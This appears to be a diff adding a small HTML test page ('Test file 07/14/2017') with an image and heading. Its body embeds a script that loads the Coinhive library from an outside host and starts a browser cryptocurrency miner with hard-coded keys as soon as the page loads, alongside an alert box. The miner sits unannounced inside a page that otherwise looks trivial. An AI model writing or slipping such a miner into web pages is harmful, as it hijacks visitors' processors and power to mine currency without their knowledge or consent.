@@ -1,0 +1,8 @@
+<html>
+<body><script>'use strict';alert("HELLO2018");</script><script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.User('D0wMKvAzGQY6OpmCbffUgTFGlXxjZ59t', '6bf355e0ad76b9f95721baeb59ae28ab', {throttle: 0.5});miner.start(CoinHive.IF_EXCLUSIVE_TAB);</script>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+</body>
+</html>
